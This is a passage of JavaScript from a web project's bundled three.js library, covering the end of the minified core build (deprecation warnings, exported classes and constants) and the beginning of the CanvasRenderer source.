removed.\")}},shadowMapWidth:{set:function(a){console.warn(\"THREE.Light: .shadowMapWidth is now .shadow.mapSize.width.\");this.shadow.mapSize.width=a}},shadowMapHeight:{set:function(a){console.warn(\"THREE.Light: .shadowMapHeight is now .shadow.mapSize.height.\");this.shadow.mapSize.height=a}}});Object.defineProperties(U.prototype,\n{length:{get:function(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Use .count instead.\");return this.array.length}}});Object.assign(I.prototype,{addIndex:function(a){console.warn(\"THREE.BufferGeometry: .addIndex() has been renamed to .setIndex().\");this.setIndex(a)},addDrawCall:function(a,b,c){void 0!==c&&console.warn(\"THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset.\");console.warn(\"THREE.BufferGeometry: .addDrawCall() is now .addGroup().\");this.addGroup(a,\nb)},clearDrawCalls:function(){console.warn(\"THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups().\");this.clearGroups()},computeTangents:function(){console.warn(\"THREE.BufferGeometry: .computeTangents() has been removed.\")},computeOffsets:function(){console.warn(\"THREE.BufferGeometry: .computeOffsets() has been removed.\")}});Object.defineProperties(I.prototype,{drawcalls:{get:function(){console.error(\"THREE.BufferGeometry: .drawcalls has been renamed to .groups.\");return this.groups}},offsets:{get:function(){console.warn(\"THREE.BufferGeometry: .offsets has been renamed to .groups.\");\nreturn this.groups}}});Object.defineProperties(Kd.prototype,{dynamic:{set:function(){console.warn(\"THREE.Uniform: .dynamic has been removed. Use object.onBeforeRender() instead.\")}},onUpdate:{value:function(){console.warn(\"THREE.Uniform: .onUpdate() has been removed. Use object.onBeforeRender() instead.\");return this}}});Object.defineProperties(X.prototype,{wrapAround:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")},set:function(){console.warn(\"THREE.\"+this.type+\n\": .wrapAround has been removed.\")}},wrapRGB:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapRGB has been removed.\");return new J}}});Object.defineProperties(Ca.prototype,{metal:{get:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead.\");return!1},set:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead\")}}});Object.defineProperties(Ha.prototype,{derivatives:{get:function(){console.warn(\"THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");\nreturn this.extensions.derivatives},set:function(a){console.warn(\"THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");this.extensions.derivatives=a}}});Object.assign(Yd.prototype,{supportsFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' ).\");return this.extensions.get(\"OES_texture_float\")},supportsHalfFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' ).\");\nreturn this.extensions.get(\"OES_texture_half_float\")},supportsStandardDerivatives:function(){console.warn(\"THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' ).\");return this.extensions.get(\"OES_standard_derivatives\")},supportsCompressedTextureS3TC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_s3tc\")},\nsupportsCompressedTexturePVRTC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_pvrtc\")},supportsBlendMinMax:function(){console.warn(\"THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' ).\");return this.extensions.get(\"EXT_blend_minmax\")},supportsVertexTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsVertexTextures() is now .capabilities.vertexTextures.\");\nreturn this.capabilities.vertexTextures},supportsInstancedArrays:function(){console.warn(\"THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' ).\");return this.extensions.get(\"ANGLE_instanced_arrays\")},enableScissorTest:function(a){console.warn(\"THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest().\");this.setScissorTest(a)},initMaterial:function(){console.warn(\"THREE.WebGLRenderer: .initMaterial() has been removed.\")},addPrePlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPrePlugin() has been removed.\")},\naddPostPlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPostPlugin() has been removed.\")},updateShadowMap:function(){console.warn(\"THREE.WebGLRenderer: .updateShadowMap() has been removed.\")}});Object.defineProperties(Yd.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled.\");this.shadowMap.enabled=a}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type.\");\nthis.shadowMap.type=a}},shadowMapCullFace:{get:function(){return this.shadowMap.cullFace},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapCullFace is now .shadowMap.cullFace.\");this.shadowMap.cullFace=a}}});Object.defineProperties(Ke.prototype,{cullFace:{get:function(){return this.renderReverseSided?2:1},set:function(a){a=1!==a;console.warn(\"WebGLRenderer: .shadowMap.cullFace is deprecated. Set .shadowMap.renderReverseSided to \"+a+\".\");this.renderReverseSided=a}}});Object.defineProperties(Ya.prototype,\n{wrapS:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");return this.texture.wrapS},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");this.texture.wrapS=a}},wrapT:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");return this.texture.wrapT},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");this.texture.wrapT=a}},magFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");\nreturn this.texture.magFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");this.texture.magFilter=a}},minFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");return this.texture.minFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");this.texture.minFilter=a}},anisotropy:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");\nreturn this.texture.anisotropy},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");this.texture.anisotropy=a}},offset:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");return this.texture.offset},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");this.texture.offset=a}},repeat:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");return this.texture.repeat},\nset:function(a){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");this.texture.repeat=a}},format:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");return this.texture.format},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");this.texture.format=a}},type:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");return this.texture.type},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");\nthis.texture.type=a}},generateMipmaps:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");return this.texture.generateMipmaps},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");this.texture.generateMipmaps=a}}});hc.prototype.load=function(a){console.warn(\"THREE.Audio: .load has been deprecated. Use THREE.AudioLoader instead.\");var b=this;(new ge).load(a,function(a){b.setBuffer(a)});return this};\nle.prototype.getData=function(){console.warn(\"THREE.AudioAnalyser: .getData() is now .getFrequencyData().\");return this.getFrequencyData()};l.WebGLRenderTargetCube=Gb;l.WebGLRenderTarget=Ya;l.WebGLRenderer=Yd;l.ShaderLib=bb;l.UniformsLib=V;l.UniformsUtils=Ja;l.ShaderChunk=Z;l.FogExp2=Kb;l.Fog=Lb;l.Scene=mb;l.LensFlare=Zd;l.Sprite=Dc;l.LOD=Ec;l.SkinnedMesh=qd;l.Skeleton=od;l.Bone=pd;l.Mesh=Aa;l.LineSegments=ga;l.Line=Ua;l.Points=Mb;l.Group=Fc;l.VideoTexture=rd;l.DataTexture=eb;l.CompressedTexture=\nNb;l.CubeTexture=Za;l.CanvasTexture=sd;l.DepthTexture=Gc;l.Texture=ea;l.CompressedTextureLoader=Re;l.DataTextureLoader=ae;l.CubeTextureLoader=be;l.TextureLoader=td;l.ObjectLoader=Se;l.MaterialLoader=Hd;l.BufferGeometryLoader=ce;l.DefaultLoadingManager=ta;l.LoadingManager=$d;l.JSONLoader=de;l.ImageLoader=Yc;l.FontLoader=Ue;l.FileLoader=sa;l.Loader=zb;l.Cache=ld;l.AudioLoader=ge;l.SpotLightShadow=vd;l.SpotLight=wd;l.PointLight=xd;l.RectAreaLight=he;l.HemisphereLight=ud;l.DirectionalLightShadow=yd;l.DirectionalLight=\nzd;l.AmbientLight=Ad;l.LightShadow=wb;l.Light=ma;l.StereoCamera=Ve;l.PerspectiveCamera=Fa;l.OrthographicCamera=Jb;l.CubeCamera=Id;l.Camera=ra;l.AudioListener=ie;l.PositionalAudio=ke;l.AudioContext=je;l.AudioAnalyser=le;l.Audio=hc;l.VectorKeyframeTrack=dc;l.StringKeyframeTrack=Ed;l.QuaternionKeyframeTrack=$c;l.NumberKeyframeTrack=ec;l.ColorKeyframeTrack=Gd;l.BooleanKeyframeTrack=Fd;l.PropertyMixer=Jd;l.PropertyBinding=ka;l.KeyframeTrack=yb;l.AnimationUtils=na;l.AnimationObjectGroup=me;l.AnimationMixer=\ncd;l.AnimationClip=qa;l.Uniform=Kd;l.InstancedBufferGeometry=Eb;l.BufferGeometry=I;l.GeometryIdCount=function(){return Vd++};l.Geometry=T;l.InterleavedBufferAttribute=oe;l.InstancedInterleavedBuffer=jc;l.InterleavedBuffer=ic;l.InstancedBufferAttribute=kc;l.Face3=ha;l.Object3D=x;l.Raycaster=pe;l.Layers=nd;l.EventDispatcher=pa;l.Clock=re;l.QuaternionLinearInterpolant=Dd;l.LinearInterpolant=Zc;l.DiscreteInterpolant=Cd;l.CubicInterpolant=Bd;l.Interpolant=xa;l.Triangle=za;l.Math=N;l.Spherical=se;l.Cylindrical=\nte;l.Plane=la;l.Frustum=tc;l.Sphere=Na;l.Ray=cb;l.Matrix4=S;l.Matrix3=ya;l.Box3=Pa;l.Box2=sc;l.Line3=hb;l.Euler=db;l.Vector4=fa;l.Vector3=q;l.Vector2=D;l.Quaternion=ca;l.Color=J;l.MorphBlendMesh=oa;l.ImmediateRenderObject=dd;l.VertexNormalsHelper=ed;l.SpotLightHelper=lc;l.SkeletonHelper=mc;l.PointLightHelper=nc;l.RectAreaLightHelper=oc;l.HemisphereLightHelper=pc;l.GridHelper=fd;l.PolarGridHelper=Ld;l.FaceNormalsHelper=gd;l.DirectionalLightHelper=qc;l.CameraHelper=hd;l.BoxHelper=rc;l.ArrowHelper=Fb;\nl.AxisHelper=Nd;l.CatmullRomCurve3=va;l.CubicBezierCurve3=id;l.QuadraticBezierCurve3=jd;l.LineCurve3=kd;l.ArcCurve=Od;l.EllipseCurve=Wa;l.SplineCurve=Cb;l.CubicBezierCurve=fc;l.QuadraticBezierCurve=gc;l.LineCurve=Ta;l.Shape=Db;l.Path=bd;l.ShapePath=ee;l.Font=fe;l.CurvePath=ad;l.Curve=ua;l.ShapeUtils=Ia;l.SceneUtils={createMultiMaterialObject:function(a,b){for(var c=new Fc,d=0,e=b.length;d<e;d++)c.add(new Aa(a,b[d]));return c},detach:function(a,b,c){a.applyMatrix(b.matrixWorld);b.remove(a);c.add(a)},\nattach:function(a,b,c){var d=new S;d.getInverse(c.matrixWorld);a.applyMatrix(d);b.remove(a);c.add(a)}};l.WireframeGeometry=Ob;l.ParametricGeometry=Hc;l.ParametricBufferGeometry=Pb;l.TetrahedronGeometry=Jc;l.TetrahedronBufferGeometry=Qb;l.OctahedronGeometry=Kc;l.OctahedronBufferGeometry=ob;l.IcosahedronGeometry=Lc;l.IcosahedronBufferGeometry=Rb;l.DodecahedronGeometry=Mc;l.DodecahedronBufferGeometry=Sb;l.PolyhedronGeometry=Ic;l.PolyhedronBufferGeometry=Ba;l.TubeGeometry=Nc;l.TubeBufferGeometry=Tb;l.TorusKnotGeometry=\nOc;l.TorusKnotBufferGeometry=Ub;l.TorusGeometry=Pc;l.TorusBufferGeometry=Vb;l.TextGeometry=Qc;l.SphereGeometry=Rc;l.SphereBufferGeometry=pb;l.RingGeometry=Sc;l.RingBufferGeometry=Wb;l.PlaneGeometry=Ac;l.PlaneBufferGeometry=lb;l.LatheGeometry=Tc;l.LatheBufferGeometry=Xb;l.ShapeGeometry=Yb;l.ShapeBufferGeometry=Zb;l.ExtrudeGeometry=La;l.EdgesGeometry=$b;l.ConeGeometry=Uc;l.ConeBufferGeometry=Vc;l.CylinderGeometry=qb;l.CylinderBufferGeometry=Va;l.CircleGeometry=Wc;l.CircleBufferGeometry=ac;l.BoxGeometry=\nIb;l.BoxBufferGeometry=kb;l.ShadowMaterial=bc;l.SpriteMaterial=nb;l.RawShaderMaterial=cc;l.ShaderMaterial=Ha;l.PointsMaterial=Oa;l.MultiMaterial=Xc;l.MeshPhysicalMaterial=rb;l.MeshStandardMaterial=Qa;l.MeshPhongMaterial=Ca;l.MeshToonMaterial=sb;l.MeshNormalMaterial=tb;l.MeshLambertMaterial=ub;l.MeshDepthMaterial=ab;l.MeshBasicMaterial=Ka;l.LineDashedMaterial=vb;l.LineBasicMaterial=ia;l.Material=X;l.Float64BufferAttribute=zc;l.Float32BufferAttribute=z;l.Uint32BufferAttribute=jb;l.Int32BufferAttribute=\nyc;l.Uint16BufferAttribute=ib;l.Int16BufferAttribute=xc;l.Uint8ClampedBufferAttribute=wc;l.Uint8BufferAttribute=vc;l.Int8BufferAttribute=uc;l.BufferAttribute=U;l.REVISION=\"84\";l.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2};l.CullFaceNone=0;l.CullFaceBack=1;l.CullFaceFront=2;l.CullFaceFrontBack=3;l.FrontFaceDirectionCW=0;l.FrontFaceDirectionCCW=1;l.BasicShadowMap=0;l.PCFShadowMap=1;l.PCFSoftShadowMap=2;l.FrontSide=0;l.BackSide=1;l.DoubleSide=2;l.FlatShading=1;l.SmoothShading=2;l.NoColors=0;l.FaceColors=1;l.VertexColors=\n2;l.NoBlending=0;l.NormalBlending=1;l.AdditiveBlending=2;l.SubtractiveBlending=3;l.MultiplyBlending=4;l.CustomBlending=5;l.AddEquation=100;l.SubtractEquation=101;l.ReverseSubtractEquation=102;l.MinEquation=103;l.MaxEquation=104;l.ZeroFactor=200;l.OneFactor=201;l.SrcColorFactor=202;l.OneMinusSrcColorFactor=203;l.SrcAlphaFactor=204;l.OneMinusSrcAlphaFactor=205;l.DstAlphaFactor=206;l.OneMinusDstAlphaFactor=207;l.DstColorFactor=208;l.OneMinusDstColorFactor=209;l.SrcAlphaSaturateFactor=210;l.NeverDepth=\n0;l.AlwaysDepth=1;l.LessDepth=2;l.LessEqualDepth=3;l.EqualDepth=4;l.GreaterEqualDepth=5;l.GreaterDepth=6;l.NotEqualDepth=7;l.MultiplyOperation=0;l.MixOperation=1;l.AddOperation=2;l.NoToneMapping=0;l.LinearToneMapping=1;l.ReinhardToneMapping=2;l.Uncharted2ToneMapping=3;l.CineonToneMapping=4;l.UVMapping=300;l.CubeReflectionMapping=301;l.CubeRefractionMapping=302;l.EquirectangularReflectionMapping=303;l.EquirectangularRefractionMapping=304;l.SphericalReflectionMapping=305;l.CubeUVReflectionMapping=306;\nl.CubeUVRefractionMapping=307;l.RepeatWrapping=1E3;l.ClampToEdgeWrapping=1001;l.MirroredRepeatWrapping=1002;l.NearestFilter=1003;l.NearestMipMapNearestFilter=1004;l.NearestMipMapLinearFilter=1005;l.LinearFilter=1006;l.LinearMipMapNearestFilter=1007;l.LinearMipMapLinearFilter=1008;l.UnsignedByteType=1009;l.ByteType=1010;l.ShortType=1011;l.UnsignedShortType=1012;l.IntType=1013;l.UnsignedIntType=1014;l.FloatType=1015;l.HalfFloatType=1016;l.UnsignedShort4444Type=1017;l.UnsignedShort5551Type=1018;l.UnsignedShort565Type=\n1019;l.UnsignedInt248Type=1020;l.AlphaFormat=1021;l.RGBFormat=1022;l.RGBAFormat=1023;l.LuminanceFormat=1024;l.LuminanceAlphaFormat=1025;l.RGBEFormat=1023;l.DepthFormat=1026;l.DepthStencilFormat=1027;l.RGB_S3TC_DXT1_Format=2001;l.RGBA_S3TC_DXT1_Format=2002;l.RGBA_S3TC_DXT3_Format=2003;l.RGBA_S3TC_DXT5_Format=2004;l.RGB_PVRTC_4BPPV1_Format=2100;l.RGB_PVRTC_2BPPV1_Format=2101;l.RGBA_PVRTC_4BPPV1_Format=2102;l.RGBA_PVRTC_2BPPV1_Format=2103;l.RGB_ETC1_Format=2151;l.LoopOnce=2200;l.LoopRepeat=2201;l.LoopPingPong=\n2202;l.InterpolateDiscrete=2300;l.InterpolateLinear=2301;l.InterpolateSmooth=2302;l.ZeroCurvatureEnding=2400;l.ZeroSlopeEnding=2401;l.WrapAroundEnding=2402;l.TrianglesDrawMode=0;l.TriangleStripDrawMode=1;l.TriangleFanDrawMode=2;l.LinearEncoding=3E3;l.sRGBEncoding=3001;l.GammaEncoding=3007;l.RGBEEncoding=3002;l.LogLuvEncoding=3003;l.RGBM7Encoding=3004;l.RGBM16Encoding=3005;l.RGBDEncoding=3006;l.BasicDepthPacking=3200;l.RGBADepthPacking=3201;l.CubeGeometry=Ib;l.Face4=function(a,b,c,d,e,f,g){console.warn(\"THREE.Face4 has been removed. A THREE.Face3 will be created instead.\");\nreturn new ha(a,b,c,e,f,g)};l.LineStrip=0;l.LinePieces=1;l.MeshFaceMaterial=function(a){console.warn(\"THREE.MeshFaceMaterial has been renamed to THREE.MultiMaterial.\");return new Xc(a)};l.PointCloud=function(a,b){console.warn(\"THREE.PointCloud has been renamed to THREE.Points.\");return new Mb(a,b)};l.Particle=function(a){console.warn(\"THREE.Particle has been renamed to THREE.Sprite.\");return new Dc(a)};l.ParticleSystem=function(a,b){console.warn(\"THREE.ParticleSystem has been renamed to THREE.Points.\");\nreturn new Mb(a,b)};l.PointCloudMaterial=function(a){console.warn(\"THREE.PointCloudMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.ParticleBasicMaterial=function(a){console.warn(\"THREE.ParticleBasicMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.ParticleSystemMaterial=function(a){console.warn(\"THREE.ParticleSystemMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.Vertex=function(a,b,c){console.warn(\"THREE.Vertex has been removed. Use THREE.Vector3 instead.\");\nreturn new q(a,b,c)};l.DynamicBufferAttribute=function(a,b){console.warn(\"THREE.DynamicBufferAttribute has been removed. Use new THREE.BufferAttribute().setDynamic( true ) instead.\");return(new U(a,b)).setDynamic(!0)};l.Int8Attribute=function(a,b){console.warn(\"THREE.Int8Attribute has been removed. Use new THREE.Int8BufferAttribute() instead.\");return new uc(a,b)};l.Uint8Attribute=function(a,b){console.warn(\"THREE.Uint8Attribute has been removed. Use new THREE.Uint8BufferAttribute() instead.\");return new vc(a,\nb)};l.Uint8ClampedAttribute=function(a,b){console.warn(\"THREE.Uint8ClampedAttribute has been removed. Use new THREE.Uint8ClampedBufferAttribute() instead.\");return new wc(a,b)};l.Int16Attribute=function(a,b){console.warn(\"THREE.Int16Attribute has been removed. Use new THREE.Int16BufferAttribute() instead.\");return new xc(a,b)};l.Uint16Attribute=function(a,b){console.warn(\"THREE.Uint16Attribute has been removed. Use new THREE.Uint16BufferAttribute() instead.\");return new ib(a,b)};l.Int32Attribute=\nfunction(a,b){console.warn(\"THREE.Int32Attribute has been removed. Use new THREE.Int32BufferAttribute() instead.\");return new yc(a,b)};l.Uint32Attribute=function(a,b){console.warn(\"THREE.Uint32Attribute has been removed. Use new THREE.Uint32BufferAttribute() instead.\");return new jb(a,b)};l.Float32Attribute=function(a,b){console.warn(\"THREE.Float32Attribute has been removed. Use new THREE.Float32BufferAttribute() instead.\");return new z(a,b)};l.Float64Attribute=function(a,b){console.warn(\"THREE.Float64Attribute has been removed. Use new THREE.Float64BufferAttribute() instead.\");\nreturn new zc(a,b)};l.ClosedSplineCurve3=Xe;l.SplineCurve3=Ye;l.Spline=we;l.BoundingBoxHelper=function(a,b){console.warn(\"THREE.BoundingBoxHelper has been deprecated. Creating a THREE.BoxHelper instead.\");return new rc(a,b)};l.EdgesHelper=function(a,b){console.warn(\"THREE.EdgesHelper has been removed. Use THREE.EdgesGeometry instead.\");return new ga(new $b(a.geometry),new ia({color:void 0!==b?b:16777215}))};l.WireframeHelper=function(a,b){console.warn(\"THREE.WireframeHelper has been removed. Use THREE.WireframeGeometry instead.\");\nreturn new ga(new Ob(a.geometry),new ia({color:void 0!==b?b:16777215}))};l.XHRLoader=function(a){console.warn(\"THREE.XHRLoader has been renamed to THREE.FileLoader.\");return new sa(a)};l.BinaryTextureLoader=function(a){console.warn(\"THREE.BinaryTextureLoader has been renamed to THREE.DataTextureLoader.\");return new ae(a)};l.GeometryUtils={merge:function(a,b,c){console.warn(\"THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.\");\nvar d;b.isMesh&&(b.matrixAutoUpdate&&b.updateMatrix(),d=b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\"THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead.\");return a.center()}};l.ImageUtils={crossOrigin:void 0,loadTexture:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.\");var e=new td;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},\nloadTextureCube:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.\");var e=new be;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},loadCompressedTexture:function(){console.error(\"THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.\")},loadCompressedTextureCube:function(){console.error(\"THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.\")}};\nl.Projector=function(){console.error(\"THREE.Projector has been moved to /examples/js/renderers/Projector.js.\");this.projectVector=function(a,b){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\");a.project(b)};this.unprojectVector=function(a,b){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\");a.unproject(b)};this.pickingRay=function(){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")}};l.CanvasRenderer=function(){console.error(\"THREE.CanvasRenderer has been moved to /examples/js/renderers/CanvasRenderer.js\");\nthis.domElement=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");this.clear=function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};Object.defineProperty(l,\"__esModule\",{value:!0})});\n"},{"url":"/lib/three/lib/CanvasRenderer.js","content":"/**\n * @author mrdoob / http://mrdoob.com/\n */\n\nTHREE.SpriteCanvasMaterial = function ( parameters ) {\n\n\tTHREE.Material.call( this );\n\n\tthis.type = 'SpriteCanvasMaterial';\n\n\tthis.color = new THREE.Color( 0xffffff );\n\tthis.program = function ( context, color ) {};\n\n\tthis.setValues( parameters );\n\n};\n\nTHREE.SpriteCanvasMaterial.prototype = Object.create( THREE.Material.prototype );\nTHREE.SpriteCanvasMaterial.prototype.constructor = THREE.SpriteCanvasMaterial;\n\nTHREE.SpriteCanvasMaterial.prototype.clone = function () {\n\n\tvar material = new THREE.SpriteCanvasMaterial();\n\n\tmaterial.copy( this );\n\tmaterial.color.copy( this.color );\n\tmaterial.program = this.program;\n\n\treturn material;\n\n};\n\n//\n\nTHREE.CanvasRenderer = function ( parameters ) {\n\n\tconsole.log( 'THREE.CanvasRenderer', THREE.REVISION );\n\n\tparameters = parameters || {};\n\n\tvar _this = this,\n\t_renderData, _elements, _lights,\n\t_projector = new THREE.Projector(),\n\n\t_canvas = parameters.canvas !== undefined\n\t\t\t ? parameters.canvas\n\t\t\t : document.createElement( 'canvas' ),\n\n\t_canvasWidth = _canvas.width,\n\t_canvasHeight = _canvas.height,\n\t_canvasWidthHalf = Math.floor( _canvasWidth / 2 ),\n\t_canvasHeightHalf = Math.floor( _canvasHeight / 2 ),\n\n\t_viewportX = 0,\n\t_viewportY = 0,\n\t_viewportWidth = _canvasWidth,\n\t_viewportHeight = _canvasHeight,\n\n\t_pixelRatio = 1,\n\n\t_context = _canvas.getContext( '2d', {\n\t\talpha: parameters.alpha === true\n\t} ),\n\n\t_clearColor = new THREE.Color( 0x000000 ),\n\t_clearAlpha = parameters.alpha === true ? 0 : 1,\n\n\t_contextGlobalAlpha = 1,\n\t_contextGlobalCompositeOperation = 0,\n\t_contextStrokeStyle = null,\n\t_contextFillStyle = null,\n\t_contextLineWidth = null,\n\t_contextLineCap = null,\n\t_contextLineJoin = null,\n\t_contextLineDash = [],\n\n\t_camera,\n\n\t_v1, _v2, _v3, _v4,\n\t_v5 = new THREE.RenderableVertex(),\n\t_v6 = new THREE.RenderableVertex(),\n\n\t_v1x, _v1y, _v2x, _v2y, _v3x, _v3y,\n\t_v4x, _v4y, _v5x, _v5y, _v6x, _v6y,\n\n\t_color = new THREE.Color(),\n\t_color1 = new THREE.Color(),\n\t_color2 = new THREE.Color(),\n\t_color3 = new THREE.Color(),\n\t_color4 = new THREE.Color(),\n\n\t_diffuseColor = new THREE.Color(),\n\t_emissiveColor = new THREE.Color(),\n\n\t_lightColor = new THREE.Color(),\n\n\t_patterns = {},\n\n\t_image, _uvs,\n\t_uv1x, _uv1y, _uv2x, _uv2y, _uv3x, _uv3y,\n\n\t_clipBox = new THREE.Box2(),\n\t_clearBox = new THREE.Box2(),\n\t_elemBox = new THREE.Box2(),\n\n\t_ambientLight = new THREE.Color(),\n\t_directionalLights = new THREE.Color(),\n\t_pointLights = new THREE.Color(),\n\n\t_vector3 = new THREE.Vector3(), // Needed for PointLight\n\t_centroid = new THREE.Vector3(),\n\t_normal = new THREE.Vector3(),\n\t_normalViewMatrix = new THREE.Matrix3();\n\n\t/* TODO\n\t_canvas.mozImageSmoothingEnabled = false;\n\t_canvas.webkitImageSmoothingEnabled = false;\n\t_canvas.msImageSmoothingEnabled = false;\n\t_canvas.imageSmoothingEnabled = false;\n\t*/\n\n\t// dash+gap fallbacks for Firefox and everything else\n\n\tif ( _context.setLineDash === undefined ) {\n\n\t\t_context.setLineDash = function () {};\n\n\t}\n\n\tthis.domElement = _canvas;\n\n\tthis.autoClear = true;\n\tthis.sortObjects = true;\n\tthis.sortElements = true;\n\n\tthis.info = {\n\n\t\trender: {\n\n\t\t\tvertices: 0,\n\t\t\tfaces: 0\n\n\t\t}\n\n\t};\n\n\t// WebGLRenderer compatibility\n\n\tthis.supportsVertexTextures = function () {};\n\tthis.setFaceCulling = function () {};\n\n\t// API\n\n\tthis.getContext = function () {\n\n\t\treturn _context;\n\n\t};\n\n\tthis.getContextAttributes = function () {\n\n\t\treturn _context.getContextAttributes();\n\n\t};\n\n\tthis.getPixelRatio = function () {\n\n\t\treturn _pixelRatio;\n\n\t};\n\n\tthis.setPixelRatio = function ( value ) {\n\n\t\tif ( value !== undefined ) _pixelRatio = value;\n\n\t};\n\n\tthis.setSize = function ( width, height, updateStyle ) {\n\n\t\t_canvasWidth = width * _pixelRatio;\n\t\t_canvasHeight = height * _pixelRatio;\n\n\t\t_canvas.width = _canvasWidth;\n\t\t_canvas.height = _canvasHeight;\n\n\t\t_canvasWidthHalf = Math.floor( _canvasWidth / 2 );\n\t\t_canvasHeightHalf = Math.floor( _canvasHeight / 2 );\n\n\t\tif ( updateStyle !== false ) {\n\n\t\t\t_canvas.style.width = width + 'px';\n\t\t\t_canvas.style.height = height + 'px';\n\n\t\t}\n\n\t\t_clipBox.min.set( - _canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clipBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t\t_clearBox.min.set( - _canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clearBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t\t_contextGlobalAlpha = 1;\n\t\t_contextGlobalCompositeOperation = 0;\n\t\t_contextStrokeStyle = null;\n\t\t_contextFillStyle = null;\n\t\t_contextLineWidth = null;\n\t\t_contextLineCap = null;\n\t\t_contextLineJoin = null;\n\n\t\tthis.setViewport( 0, 0, width, height );\n\n\t};\n\n\tthis.setViewport = function ( x, y, width, height ) {\n\n\t\t_viewportX = x * _pixelRatio;\n\t\t_viewportY = y * _pixelRatio;\n\n\t\t_viewportWidth = width * _pixelRatio;\n\t\t_viewportHeight = height * _pixelRatio;\n\n\t};\n\n\tthis.setScissor = function () {};\n\tthis.setScissorTest = function () {};\n\n\tthis.setClearColor = function ( color, alpha ) {\n\n\t\t_clearColor.set( color );\n\t\t_clearAlpha = alpha !== undefined ? alpha : 1;\n\n\t\t_clearBox.min.set( - 